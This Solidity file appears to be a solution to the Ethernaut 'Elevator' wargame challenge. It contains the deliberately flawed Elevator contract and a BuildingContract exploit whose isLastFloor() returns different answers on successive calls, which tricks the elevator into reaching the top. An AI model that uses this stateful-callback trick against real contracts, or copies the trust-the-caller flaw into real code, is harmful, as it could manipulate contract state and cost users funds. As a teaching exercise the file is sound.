// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract BuildingContract is Building {
    address public owner;
    Elevator public original;
    bool is_first = true;

    constructor(address payable _to) public {
        owner = msg.sender;
        original = Elevator(_to);
    }

    function gogo() public {
        original.goTo(666);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (is_first) {
            is_first = false;
            return false;
        } else {
            return true;
        }
    }
}
